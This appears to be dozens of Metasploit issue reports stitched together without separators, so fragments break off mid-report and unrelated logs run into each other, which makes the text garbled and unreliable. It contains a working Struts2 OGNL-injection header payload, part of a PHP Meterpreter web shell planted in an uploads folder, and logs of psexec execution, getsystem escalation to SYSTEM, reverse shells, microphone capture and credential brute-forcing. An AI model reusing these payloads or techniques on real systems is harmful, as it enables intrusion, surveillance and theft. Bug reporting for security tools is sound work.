[2672] [1e8] [enc] enabling the context [2672] [1e8] [enc] packet buffer size is: 423 [2672] [1e8] [enc] sending header (before xor): [ ] [ ] [ ] [ ] [ ] [2672] [1e8] [xor] xoring 419 bytes with key f0c84732 [2672] [1e8] [enc] packet encoded and ready for transmission [2672] [1e8] [enc] sending header (after xor): [ ] [ ] [ ] [ ] [ ] [2672] [1e8] [packet] sending packet to remote, length: 423 [2672] [1e8] [packet] sending packet to remote, data: 0000000000000000000000000044d210 [2672] [1e8] [packet] remote: 00000000003be3a0 [2672] [1e8] [packet] transport: 0000000003102d10 [2672] [1e8] [packet] packet transmit: 0000000004657588 [2672] [1e8] [packet] packet sent! [2672] [1e8] [command] calling completion handlers..
[2672] [1e8] [pkt find] looking for type 65538 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] types don't match, skipping
[2672] [1e8] [pkt find] tlv header length: 41 [2672] [1e8] [pkt find] tlv header type: 65538 [2672] [1e8] [pkt find] found! [2672] [1e8] [command] completion handlers finished for core_negotiate_tlv_encryption
[2672] [1e8] [command] packet is not local, destroying [2672] [1e8] [command] packet destroyed [2672] [1e8] [command] command processing finishing
returning: true [2672] [1e8] [command] executed inline -> commands: 00000000043578e0 command1: 000000000468cf28 command2: 0000000000000000 [2672] [1e8] [command] cleaning up commands ``` some times migration completed successfully from msf pro ui
but more often as like i wrote upper
some times migration fail by timeout in `msfconsole`
## system stuff
intermittent lies
don't open and exit with this error code in terminal
./msfconsole
/home/xcoder/evil/metasploit-framework/lib/msf/core/post/windows/railgun.rb:10:in `<module:railgun>': uninitialized constant rex::post::meterpreter::extensions::stdapi::railgun::railgun::builtin_libraries (nameerror) from /home/xcoder/evil/metasploit-framework/lib/msf/core/post/windows/railgun.rb:7:in `<module:windows>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/post/windows/railgun.rb:6:in `<class:post>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/post/windows/railgun.rb:5:in `<module:msf>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/post/windows/railgun.rb:4:in `<top (required)>' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require_with_backports' from /home/xcoder/evil/metasploit-framework/lib/msf/core/post/windows.rb:13:in `<module:windows>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/post/windows.rb:3:in `<top (required)>' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require_with_backports' from /home/xcoder/evil/metasploit-framework/lib/msf/core/post.rb:18:in `<class:post>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/post.rb:6:in `<top (required)>' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require_with_backports' from /home/xcoder/evil/metasploit-framework/lib/msf/core/exploit.rb:32:in `<class:exploit>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/exploit.rb:30:in `<module:msf>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/exploit.rb:5:in `<top (required)>' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require_with_backports' from /home/xcoder/evil/metasploit-framework/lib/msf/core/auxiliary/mqtt.rb:3:in `<top (required)>' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require_with_backports' from /home/xcoder/evil/metasploit-framework/lib/msf/core/auxiliary/mixins.rb:26:in `<top (required)>' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require_with_backports' from /home/xcoder/evil/metasploit-framework/lib/msf/core/auxiliary.rb:16:in `<class:auxiliary>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/auxiliary.rb:14:in `<module:msf>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/auxiliary.rb:4:in `<top (required)>' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require' from /var/lib/gems/2.3.0/gems/backports-3.11.0/lib/backports/std_lib.rb:9:in `require_with_backports' from /home/xcoder/evil/metasploit-framework/lib/msf/core.rb:66:in `<top (required)>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/payload/apk.rb:3:in `require' from /home/xcoder/evil/metasploit-framework/lib/msf/core/payload/apk.rb:3:in `<top (required)>' from /home/xcoder/evil/metasploit-framework/lib/msf/core/payload_generator.rb:2:in `require' from /home/xcoder/evil/metasploit-framework/lib/msf/core/payload_generator.rb:2:in `<top (required)>' from ./msfconsole:47:in `require' from ./msfconsole:47:in `<main>'
``` ## system stuff
linux parrot 4.11.0-parrot6-amd64 #1 smp parrot 4.11.6-1parrot6 (2017-06-28) x86_64 gnu/linux
`puts 'command completed successfully'` for only shell sessions
## notes it's possible that `def cmd_exec(cmd, args=nil, time_out=15)` was intended to be used in the form of `'/path/to/command', 'argument', int_timeout` - but that's no excuse for inconsistent and undocumented behavior dependent on session type
additionally, using the above method invocation introduced unrelated issues (again, only with meterpreter sessions and not shell sessions) when dealing with `timeout` handling
eyeballing the `cmd_exec` method in `lib/msf/core/post/common.rb` (shown below) shows that `break` is invoked inside the `while (d = process.channel.read)` loop if execution time has reached `timeout` or we received data during a previous iteration but not this iteration
that makes no sense
```ruby def cmd_exec(cmd, args=nil, time_out=15) case session.type when /meterpreter/ # --- removed for brevity --- session.response_timeout = time_out process = session.sys.process.execute(cmd, args, {\'hidden\' => true, \'channelized\' => true}) o = "" # wait up to time_out seconds for the first bytes to arrive while (d = process.channel.read) if d == "" if (time.now.to_i - start < time_out) && (o == \'\') sleep 0.1 else break end else o << d end end o.chomp! if o
scanned half of the list then failed.
[-] auxiliary failed: nomethoderror undefined method `set_key' for #<openssl::pkey::dh: >
[-] call stack:
[-] /usr/share/metasploit-framework/lib/rex/proto/rfb/cipher.rb:87:in `encrypt_ard'
[-] /usr/share/metasploit-framework/lib/rex/proto/rfb/client.rb:243:in `negotiate_ard_auth'
[-] /usr/share/metasploit-framework/lib/rex/proto/rfb/client.rb:111:in `authenticate_with_type'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/vnc/ard_root_pw.rb:80:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
## system stuff
ran on part of the list then crashed
[-] auxiliary failed: nomethoderror undefined method `set_key' for #<openssl::pkey::dh: >
[-] call stack:
[-] /usr/share/metasploit-framework/lib/rex/proto/rfb/cipher.rb:87:in `encrypt_ard'
[-] /usr/share/metasploit-framework/lib/rex/proto/rfb/client.rb:243:in `negotiate_ard_auth'
[-] /usr/share/metasploit-framework/lib/rex/proto/rfb/client.rb:111:in `authenticate_with_type'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/vnc.rb:117:in `block in vnc_auth'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/vnc.rb:116:in `times'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/vnc.rb:116:in `vnc_auth'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/vnc.rb:62:in `attempt_login'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:179:in `block in each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:132:in `block in each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each_line'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/vnc/vnc_login.rb:92:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
pluma coding window opens and shows all of the code instead of webcam visual
webcam has light and is activated *** you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
stdapi is unable to load even manually giving the error `failed to load extension: no response was received to the core_enumextcmd request.` side note, it works on some victims and others throw this error
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1182:in `each'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1182:in `cmd_load'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:548:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:510:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `run_single'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:196:in `run'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:567:in `_interact'
/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:49:in `interact'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1380:in `cmd_sessions'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:548:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:510:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:206:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:48:in `<main>'
[01/04/2018 11:35:43] [w(0)] core: exception in scheduler thread rex::timeouterror operation timed out.
``` ## system stuff
ben's module
![ben]( my module
![mymy]( my code : ## system stuff n/a
all sessions ip are 127.0.0.1 you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
lines are infrequently truncated by new lines and some data is lost, e.g
`[+] x.x.x.x:161 - login successful: internal (acc[+] y.y.y.y:161 - login successful: internal (access level: read-write); proof (sysdescr.0): hp ethernet multi-environment,rom none,jetdirect,jdnnn,eeprom jdinnnnnnnn,cidate nn/nn/nnnn` ## system stuff - 2-core, 4-thread processor
- environment had a large number of printers and network infrastructure equipment responding to snmp queries with multiple community strings (e.g., one string for read-only, one string for read-write)
it doesn't spawn any meterpreter shells that connects back **meterpreter reverse tcp** `[*] started reverse tcp handler on 192.168.1.6:3333 via the meterpreter on session 1 [*] 192.168.1.8:445 - connecting to the server..
[*] 192.168.1.8:445 - authenticating to 192.168.1.8:445 as user 'hack'..
[*] 192.168.1.8:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe [*] 192.168.1.8:445 - powershell found [*] 192.168.1.8:445 - selecting powershell target [*] 192.168.1.8:445 - powershell command length: 2525 [*] 192.168.1.8:445 - executing the payload..
[*] 192.168.1.8:445 - binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.8[\\svcctl] ..
[*] 192.168.1.8:445 - bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.8[\\svcctl] ..
[*] 192.168.1.8:445 - obtaining a service manager handle..
[*] 192.168.1.8:445 - creating the service..
[+] 192.168.1.8:445 - successfully created the service [*] 192.168.1.8:445 - starting the service..
[+] 192.168.1.8:445 - service start timed out, ok if running a command or non-service executable..
[*] 192.168.1.8:445 - removing the service..
[+] 192.168.1.8:445 - successfully removed the service [*] 192.168.1.8:445 - closing service handle..
[*] exploit completed, but no session was created.` **meterpreter bind tcp** '[*] started bind handler
[*] 192.168.1.8:445 - connecting to the server..
[*] 192.168.1.8:445 - authenticating to 192.168.1.8:445 as user 'hack'..
[*] 192.168.1.8:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe [*] 192.168.1.8:445 - powershell found [*] 192.168.1.8:445 - selecting powershell target [*] 192.168.1.8:445 - powershell command length: 2517 [*] 192.168.1.8:445 - executing the payload..
[*] 192.168.1.8:445 - binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.8[\\svcctl] ..
[*] 192.168.1.8:445 - bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.8[\\svcctl] ..
[*] 192.168.1.8:445 - obtaining a service manager handle..
[*] 192.168.1.8:445 - creating the service..
[+] 192.168.1.8:445 - successfully created the service [*] 192.168.1.8:445 - starting the service..
[+] 192.168.1.8:445 - service start timed out, ok if running a command or non-service executable..
[*] 192.168.1.8:445 - removing the service..
[+] 192.168.1.8:445 - successfully removed the service [*] 192.168.1.8:445 - closing service handle..
[*] exploit completed, but no session was created.' ## system stuff
kali linux 2017.2
instead it fails like this and does not complete the rhost list
[-] auxiliary failed: runtimeerror unable to parse encryption req during pre-login, this may not be a mssql server
[-] call stack:
[-] /usr/share/metasploit-framework/lib/metasploit/framework/mssql/client.rb:637:in `mssql_prelogin'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/mssql/client.rb:47:in `mssql_login'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/mssql.rb:50:in `attempt_login'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:154:in `block in each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:121:in `each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/mssql/mssql_login.rb:71:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
``` ## system stuff
when i came back with the same options for the listener i have this
[*] handling request from 192.168.1.1; (uuid: 9q0vn4n9) attaching **orphaned/stageless session...**
[*] meterpreter session 1 opened (192.168.1.5:443 -> 192.168.1.1:3072) at 2017-11-05 14:23:49 +0100 and **there is nothing i can do in this session.** meterpreter > ls
[-] unknown command: ls
## system stuff
i'm working on a kali vm, a windows 7 vm, and even on my host a machine a windows 10 i have the same issue.
it's perfectly working with other payload like python on macosx, i can exit and get back my shell again
instead i get this msg and no connection whatsoever **[*] [2017.10.30-21:45:06] encoded stage with x86/shikata_ga_nai**
msf exploit(wmi_persistence) > exploit [-] exploit failed: nameerror uninitialized constant msf::post::windows::priv::integrity_level_side
msf exploit(wmi_persistence) > ```
## system stuff
the following output appears: `no platform was selected, choosing msf::module::platform::windows from the payload`
`no arch selected, selecting arch: x86 from the payload`
`found 1 compatible encoders`
`attempting to encode payload with 7 iterations of x86/shikata_ga_nai`
`x86/shikata_ga_nai succeeded with size 360 (iteration=0)`
`x86/shikata_ga_nai succeeded with size 387 (iteration=1)`
`x86/shikata_ga_nai succeeded with size 414 (iteration=2)`
`x86/shikata_ga_nai succeeded with size 441 (iteration=3)`
`x86/shikata_ga_nai succeeded with size 468 (iteration=4)`
`x86/shikata_ga_nai succeeded with size 495 (iteration=5)`
`x86/shikata_ga_nai succeeded with size 522 (iteration=6)`
`x86/shikata_ga_nai chosen with final size 522`
`payload size: 522 bytes`
`error: undefined method 'map' for nil:nilclass`
`did you mean? tap` in addition, a zero-byte notfceux.exe file is created
## system stuff
tags, comments and info from the xml file are not being imported using db_import
tags, comments and info are empty
## system stuff
sometimes errors out:
[-] error running command record_mic: rex::timeouterror operation timed out
## system stuff
tested on : android 6.0.1 - linux 3.10.61-8299335 (armv8l) - samsung j7 dual sim 3g.
gets the error: [-] stdapi_ui_desktop_screenshot: operation failed: 1 ## system stuff
tested on : android 6.0.1 - linux 3.10.61-8299335 (armv8l) - samsung j7 dual sim.
the shell spawns and makes a session but then the shell dies you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces their wasnt anything regarding the module in the log files
backbox linux only has metasploit-framework installed ## system stuff
nothing on client side ## target system ie 11.0.9600.18015
windows 7 (6.1.7601)
[*] 192.168.0.108:445 - sending packet from source port: 2014
[-] 192.168.0.108:445 - exception sending packet: unknown tcp level option name: keepcnt *] 192.168.0.108:445 - sending packet from source port: 3175
[-] 192.168.0.108:445 - exception sending packet: too many open files - socket(2) you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
## system stuff
currently, a single very ambitious http request is made
get /blah/foo http/1.1
host: 127.0.0.1
user-agent: mozilla/4.0 (compatible; msie 6.0; windows nt 5.1)
content-type: %{(#_='multipart/form-data').(#dm=@ognl.ognlcontext@default_member_access).(#_memberaccess?(#_memberaccess=#dm):((#container=#context['com.opensymphony.xwork2.actioncontext.container']).(#ognlutil=#container.getinstance(@com.opensymphony.xwork2.ognl.ognlutil@class)).(#ognlutil.getexcludedpackagenames().clear()).(#ognlutil.getexcludedclasses().clear()).(#context.setmemberaccess(#dm)))).(#os=@java.lang.system@getproperty('os.name')).(#context['com.opensymphony.xwork2.dispatcher.httpservletresponse'].addheader('rsgr', #os))}
x-jerk: content-type: application/x-www-form-urlencoded
connection: close
``` first, it seems the content-type header is added twice
this is probably a bug
second, if static methods aren't enabled in the ognl config, then calling static methods will result in an exception being thrown
for instance: ```(#ognlutil.getexcludedpackagenames().clear())``` getexcludedpackagenames() is a static method on the ognlutil class
because this thrown an exception, the ognl script execution is halted, so the header is never added and the check fails
i propose the first request only contain a content-type with ```(#context['com.opensymphony.xwork2.dispatcher.httpservletresponse'].addheader('rsgr', 'fdsa')``` randomized with rex::text works too, but this is a fool-proof way to determine whether the host is vulnerable
the rest of the information gathering such as os name should be done in a second request if the host is determined to be vulnerable
## system stuff
error message comes up parse error: syntax error, unexpected '[' in /var/www/admin/uploads/shell5.php on line 1 i've looked at the source of the shell and saw this:
/*<?php /**/ if (!isset($globals['channels'])) { $globals['channels'] = array(); } if (!isset($globals['channel_process_map'])) { $globals['channel_process_map'] = array(); } if (!isset($globals['resource_type_map'])) { $globals['resource_type_map'] = array(); } if (!isset($globals['udp_host_map'])) { $globals['udp_host_map'] = array(); } if (!isset($globals[ question:
this should be without the /* comment, right?
even when removing it, behavior is the same
the <?php seems not to be closed anywhere
source is attached as txt-file
## system stuff
it returns a div by zero error: msf auxiliary(openssl_heartbleed) > exploit [*] 10.42.25.91:443 - scanning for private keys
[*] 10.42.25.91:443 - getting public key constants...
[*] 10.42.25.91:443 - 2017-09-11 20:53:38 utc - starting.
[*] 10.42.25.91:443 - 2017-09-11 20:53:38 utc - attempt 0...
[*] 10.42.25.91:443 - 2017-09-11 20:53:58 utc - attempt 5...
[*] error: 10.42.25.91: openssl::bnerror div by zero
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
msf auxiliary(openssl_heartbleed) > you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
victim's keyboard is still working
## system stuff framework: 4.15.7-dev
console : 4.15.7-dev ### i installed metasploit with: - [x] kali package via apt ### os
kali rolling - 2017.1
windows 7 sp1
uses http (not encrypted) ## system stuff host1/2 - windows 2008 r2 x64
it closes msfconsole
what's weird it shows do you want to background after it closes msfconsole
## system stuff
it creates the process and opens a channel, but you cannot do anything with it from there
msf exploit(handler) > [*] handling request from 10.14.1.1; (uuid: fzrwgnnz) redirecting stageless connection from /tpqjucscgi_5kf8rolfhnw-chx1s-lrigqx7merwso4c1znfnzjvvgzutp0krj7 with ua 'mozilla/5.0 (windows nt 6.1; trident/7.0; rv:11.0) like gecko'
[*] handling request from 10.14.1.1; (uuid: fzrwgnnz) attaching orphaned/stageless session...
[*] meterpreter session 1 opened (10.14.1.6:13035 -> 10.14.1.1:49092) at 2017-08-19 17:58:20 -0500 msf exploit(handler) > sessions -i 1
[*] starting interaction with 1..
meterpreter > shell
process 3663 created.
channel 1 created.
id terminate channel 1? [y/n] y terminate channel 1? [y/n] y terminate channel 1? [y/n] y^c[-] error running command shell: interrupt ``` ## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
see above command line output
## system stuff
```[-] 192.168.1.7:445 - exploit aborted due to failure: no-access: 192.168.1.7:445 - unable to authenticate with given credentials: login failed: connection reset by peer```
tcpdump -i eth0 port 445
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type en10mb (ethernet), capture size 262144 bytes
03:15:49.371810 ip 192.168.1.6.42617 > 192.168.1.4.microsoft-ds: flags [s], seq 3950084154, win 29200, options [mss 1460,sackok,ts val 1190323 ecr 0,nop,wscale 7], length 0
03:15:49.373213 ip 192.168.1.4.microsoft-ds > 192.168.1.6.42617: flags [s.], seq 1061347772, ack 3950084155, win 8192, options [mss 1418,nop,wscale 8,sackok,ts val 5030122 ecr 1190323], length 0
03:15:49.373254 ip 192.168.1.6.42617 > 192.168.1.4.microsoft-ds: flags [.], ack 1, win 229, options [nop,nop,ts val 1190323 ecr 5030122], length 0
03:15:49.374844 ip 192.168.1.6.42617 > 192.168.1.4.microsoft-ds: flags [p.], seq 1:89, ack 1, win 229, options [nop,nop,ts val 1190324 ecr 5030122], length 88 smb packet: smbnegprot (request) 03:15:49.376486 ip 192.168.1.4.microsoft-ds > 192.168.1.6.42617: flags [r.], seq 1, ack 89, win 0, length 0
## system stuff
currently the module is always printing the message "checking for verb tampering (head)" ## system stuff metasploit-framework/blob/master/modules/auxiliary/scanner/http/jboss_vulnscan.rb
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
without setting the winlogon pid, i got this error message: ```
[*] winlogon pid: specified
i'm trusting you...
[*] migrating from pid:2376
[-] unable to migrate, try getsystem first
[*] post module execution completed
while setting the pid all works.
no hosts are shown you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces nothing found in log files ## system stuff
the application terminates in the middle of the shellcode and does not hit the breakpoint i placed at the last instruction of the shellcode (which is always `call ebp`)
i have tried all exitfunc variations (seh, thread and none)
unfortunately, none of them gave me the desired behavior and the application always terminates if the remote listener is not up
when the application terminates, eip is pointing to "ntdll.kifastsystemcallret" and the top of the stack is pointing to "ntdll.zwterminateprocess+0c" note: i confirmed that everything works fine if the remote system "10.0.0.50" is listening on port 4444
the reverse shell is spawned and once exited (by typing exit on the spawned shell), then the application continue to work normally
so the problem i am facing is only when the remote listener is not running.
throwing an error
meterpreter > sysinfo
computer : 192.168.1.108
os : kali kali-rolling (linux 4.9.0-kali3-amd64)
architecture : x64
meterpreter : x64/linux
meterpreter > run post/linux/gather/gnome_keyring_dump [-] post failed: rex::post::meterpreter::requesterror stdapi_railgun_api: operation failed: 1
[-] call stack:
[-] /usr/local/share/metasploit-framework-master/lib/rex/post/meterpreter/extensions/stdapi/railgun/dll.rb:266:in `process_function_call'
[-] /usr/local/share/metasploit-framework-master/lib/rex/post/meterpreter/extensions/stdapi/railgun/dll.rb:84:in `call_function'
[-] /usr/local/share/metasploit-framework-master/lib/rex/post/meterpreter/extensions/stdapi/railgun/dll_wrapper.rb:24:in `method_missing'
[-] /usr/local/share/metasploit-framework-master/modules/post/linux/gather/gnome_keyring_dump.rb:195:in `run' ## system stuff
msf exploit(handler) > run -j
[*] exploit running as background job
[*] started reverse tcp handler on 192.168.10.146:4444 [*] starting the payload handler...
msf exploit(handler) > [*] sending stage (957487 bytes) to 192.168.10.135
[*] meterpreter session 3 opened (192.168.10.146:4444 -> 192.168.10.135:59577) at 2017-05-26 14:11:07 -0600 msf exploit(handler) > sessions active sessions
=============== id type information connection -- ---- ----------- ---------- 3 meterpreter x86/windows desktop-c7f0fr8\\me @ desktop-c7f0fr8 192.168.10.146:4444 -> 192.168.10.135:59577 (192.168.10.135) msf exploit(handler) > sessions -i 3
[*] starting interaction with 3..
meterpreter > getuid
server username: desktop-c7f0fr8\\me
meterpreter > getsystem
...got system via technique 1 (named pipe impersonation (in memory/admin)).
meterpreter > getuid
server username: nt authority\\system
meterpreter > background [*] backgrounding session 3...
msf exploit(handler) > sessions active sessions
=============== id type information connection -- ---- ----------- ---------- 3 meterpreter x86/windows desktop-c7f0fr8\\me @ desktop-c7f0fr8 192.168.10.146:4444 -> 192.168.10.135:59577 (192.168.10.135) ```
## new behavior ```
msf exploit(handler) > run -j
[*] exploit running as background job
[*] started reverse tcp handler on 192.168.10.146:4444 [*] starting the payload handler...
msf exploit(handler) > [*] sending stage (957487 bytes) to 192.168.10.135
[*] meterpreter session 2 opened (192.168.10.146:4444 -> 192.168.10.135:49216) at 2017-05-26 17:11:00 -0600 msf exploit(handler) > sessions active sessions
=============== id type information connection -- ---- ----------- ---------- 2 meterpreter x86/windows desktop-c7f0fr8\\me @ desktop-c7f0fr8 192.168.10.146:4444 -> 192.168.10.135:49216 (192.168.10.135) msf exploit(handler) > sessions -i 2
[*] starting interaction with 2..
meterpreter > getuid
server username: desktop-c7f0fr8\\me
meterpreter > getsystem
...got system via technique 1 (named pipe impersonation (in memory/admin)).
meterpreter > getuid
server username: nt authority\\system
meterpreter > background
[*] backgrounding session 2...
msf exploit(handler) > sessions active sessions
=============== id type information connection -- ---- ----------- ---------- 2 meterpreter x86/windows nt authority\\system @ desktop-c7f0fr8 192.168.10.146:4444 -> 192.168.10.135:49216 (192.168.10.135) ```
the module stops after the first non-ascii word and crashes as above
## system stuff kali vm updated as of 5-20-2017 running on virtualbox
vulnerabilities are imported but without any references information
## system stuff
[*] [2017.05.17-16:45:36] listening on 192.168.1.20:23...
[-] [2017.05.17-16:45:39] auxiliary failed: nomethoderror undefined method `on_client_connect_proc=' for #<rex::post::meterpreter::extensions::stdapi::net::socketsubsystem::tcpserverchannel: >
[-] [2017.05.17-16:45:39] call stack:
[-] [2017.05.17-16:45:39] /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.16/lib/msf/core/exploit/tcp_server.rb:121:in `start_service'
[-] [2017.05.17-16:45:39] /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.16/lib/msf/core/exploit/tcp_server.rb:49:in `exploit'
[-] [2017.05.17-16:45:39] /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.16/modules/auxiliary/server/capture/telnet.rb:47:in `run'
[*] [2017.05.17-16:45:39] server stopped.
``` ## system stuff
this error occurs and the scanner crashes: [-] auxiliary failed: rex::argumenterror an invalid argument was specified
xdr: too little data to decode (0)
[-] call stack:
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-encoder-0.1.2/lib/rex/encoder/xdr.rb:20:in `decode_int!'
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-encoder-0.1.2/lib/rex/encoder/xdr.rb:101:in `block in decode!'
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-encoder-0.1.2/lib/rex/encoder/xdr.rb:92:in `collect'
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-encoder-0.1.2/lib/rex/encoder/xdr.rb:92:in `decode!'
[-] /usr/share/metasploit-framework/lib/msf/core/exploit/sunrpc.rb:75:in `sunrpc_create'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/nfs/nfsmount.rb:43:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn' you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
its failing with the error
post failed: runtimeerror could not determine uid: ""
